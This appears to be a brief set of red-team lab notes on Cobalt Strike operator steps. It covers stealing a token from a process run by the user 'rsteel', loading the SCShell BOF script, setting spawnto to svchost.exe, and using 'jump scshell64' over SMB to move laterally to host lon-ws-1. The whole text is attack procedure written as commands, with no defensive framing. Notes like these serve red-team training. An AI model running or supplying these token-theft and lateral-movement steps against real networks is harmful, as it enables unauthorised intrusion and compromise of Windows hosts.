impersonate the desired user (rsteel):
  right-click the beacon, explore > process list
  find a process running as rsteel, then click and 'Steal Token'
load scshell:
  cobalt strike > script manager
  load, then select C:\Tools\SCShell\CS-BOF\scshell.cna
scshell uses the service binary payload, so we must set the spawnto:
  ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
move laterally using jump:
  jump scshell64 lon-ws-1 smb
